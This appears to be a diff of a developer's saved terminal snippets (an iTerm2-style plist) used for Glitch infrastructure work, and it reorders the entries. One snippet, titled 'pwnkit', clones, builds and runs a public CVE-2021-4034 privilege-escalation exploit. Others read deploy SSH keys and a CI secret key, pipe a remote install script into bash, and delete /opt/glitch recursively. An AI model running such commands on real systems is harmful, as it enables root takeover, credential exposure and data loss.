@@ -6365,11 +6365,86 @@
 			<key>escaping</key>
 			<integer>2</integer>
 			<key>guid</key>
-			<string>1662174B-74ED-4700-ACFD-94F058A3BC0E</string>
+			<string>F63C6493-2E09-4FA3-91B8-0549DFD1B588</string>
 			<key>title</key>
-			<string>pwnkit</string>
+			<string>check deploy keys</string>
 			<key>value</key>
-			<string>git clone https://github.com/ryaagard/CVE-2021-4034.git &amp;&amp; cd CVE-2021-4034 &amp;&amp; make all &amp;&amp; ./exploit; exit
+			<string>sudo su deploy -l
+cat ~/.ssh/authorized_keys
+cat /opt/glitch/ci/secrets/id-deploy
+
+</string>
+			<key>version</key>
+			<integer>2</integer>
+		</dict>
+		<dict>
+			<key>escaping</key>
+			<integer>2</integer>
+			<key>guid</key>
+			<string>3FCA9DEF-CB54-4150-9FE2-0A10A1341E04</string>
+			<key>title</key>
+			<string>check for only fastly keys</string>
+			<key>value</key>
+			<string>diff &lt;(sudo ssh-keygen -l -Emd5 -f /home/deploy/.ssh/authorized_keys) &lt;(ssh-keygen -l -Emd5 -f /opt/glitch/ci/secrets/id-deploy) &amp;&amp; echo $?
+</string>
+			<key>version</key>
+			<integer>2</integer>
+		</dict>
+		<dict>
+			<key>escaping</key>
+			<integer>2</integer>
+			<key>guid</key>
+			<string>B1383A71-BFD0-4886-90CC-D5045D7869E1</string>
+			<key>title</key>
+			<string>dev env initial setup</string>
+			<key>value</key>
+			<string>curl -L https://iterm2.com/shell_integration/install_shell_integration_and_utilities.sh | bash
+git config --global --add user.name "cori schlegel"
+git config --global --add user.email "cori@glitch.com"
+git config --global --add core.editor "vim"
+rm -rf /opt/glitch/* /opt/glitch/.*
+git clone git@github.com:glitchdotcom/Glitch.git /opt/glitch
+echo "now go grab repo.key"
+echo "install and config lazygit?"
+</string>
+			<key>version</key>
+			<integer>2</integer>
+		</dict>
+		<dict>
+			<key>escaping</key>
+			<integer>2</integer>
+			<key>guid</key>
+			<string>66FEEF1B-170E-4209-9DBD-8DF68F38CCF2</string>
+			<key>title</key>
+			<string>history with datetime</string>
+			<key>value</key>
+			<string>HISTTIMEFORMAT='%F %T ' history</string>
+			<key>version</key>
+			<integer>2</integer>
+		</dict>
+		<dict>
+			<key>escaping</key>
+			<integer>2</integer>
+			<key>guid</key>
+			<string>42CAFA06-098B-433F-BDC4-985FB3491842</string>
+			<key>title</key>
+			<string>hostnames by role</string>
+			<key>value</key>
+			<string>export env=production role=community; for host in $(ci/hostnames-by-role $role $env) do echo "$host.$env" done</string>
+			<key>version</key>
+			<integer>2</integer>
+		</dict>
+		<dict>
+			<key>escaping</key>
+			<integer>2</integer>
+			<key>guid</key>
+			<string>8F8E139A-413D-49A8-B145-067DCB9CA78B</string>
+			<key>title</key>
+			<string>post-failure dev re-bootstrap</string>
+			<key>value</key>
+			<string>cd /opt/glitch/shared &amp;&amp; rm -rf node_modules &amp;&amp; sh/compile
+cd /opt/glitch/proxy &amp;&amp; rm -rf node_modules &amp;&amp; sh/compile
+cd /opt/glitch/api &amp;&amp; rm -rf node_modules &amp;&amp; npm i
 </string>
 			<key>version</key>
 			<integer>2</integer>
@@ -6530,60 +6605,12 @@ bash &lt;(curl https://raw.githubusercontent.com/ellie/atuin/main/install.sh)</s
 			<key>escaping</key>
 			<integer>2</integer>
 			<key>guid</key>
-			<string>66FEEF1B-170E-4209-9DBD-8DF68F38CCF2</string>
+			<string>1662174B-74ED-4700-ACFD-94F058A3BC0E</string>
 			<key>title</key>
-			<string>history with datetime</string>
+			<string>pwnkit</string>
 			<key>value</key>
-			<string>HISTTIMEFORMAT='%F %T ' history</string>
-			<key>version</key>
-			<integer>2</integer>
-		</dict>
-		<dict>
-			<key>escaping</key>
-			<integer>2</integer>
-			<key>guid</key>
-			<string>8F8E139A-413D-49A8-B145-067DCB9CA78B</string>
-			<key>title</key>
-			<string>post-failure dev re-bootstrap</string>
-			<key>value</key>
-			<string>cd /opt/glitch/shared &amp;&amp; rm -rf node_modules &amp;&amp; sh/compile
-cd /opt/glitch/proxy &amp;&amp; rm -rf node_modules &amp;&amp; sh/compile
-cd /opt/glitch/api &amp;&amp; rm -rf node_modules &amp;&amp; npm i
+			<string>git clone https://github.com/ryaagard/CVE-2021-4034.git &amp;&amp; cd CVE-2021-4034 &amp;&amp; make all &amp;&amp; ./exploit; exit
 </string>
-			<key>version</key>
-			<integer>2</integer>
-		</dict>
-		<dict>
-			<key>escaping</key>
-			<integer>2</integer>
-			<key>guid</key>
-			<string>B1383A71-BFD0-4886-90CC-D5045D7869E1</string>
-			<key>title</key>
-			<string>dev env initial setup</string>
-			<key>value</key>
-			<string>curl -L https://iterm2.com/shell_integration/install_shell_integration_and_utilities.sh | bash
-git config --global --add user.name "cori schlegel"
-git config --global --add user.email "cori@glitch.com"
-git config --global --add core.editor "vim"
-rm -rf /opt/glitch/* /opt/glitch/.*
-git clone git@github.com:glitchdotcom/Glitch.git /opt/glitch
-echo "now go grab repo.key"
-echo "install and config lazygit?"
-</string>
-			<key>version</key>
-			<integer>2</integer>
-		</dict>
-		<dict>
-			<key>escaping</key>
-			<integer>2</integer>
-			<key>guid</key>
-			<string>F63C6493-2E09-4FA3-91B8-0549DFD1B588</string>
-			<key>title</key>
-			<string>check deploy keys</string>
-			<key>value</key>
-			<string>sudo su deploy -l
-cat ~/.ssh/authorized_keys
-cat /opt/glitch/ci/secrets/id-deploy</string>
 			<key>version</key>
 			<integer>2</integer>
 		</dict>
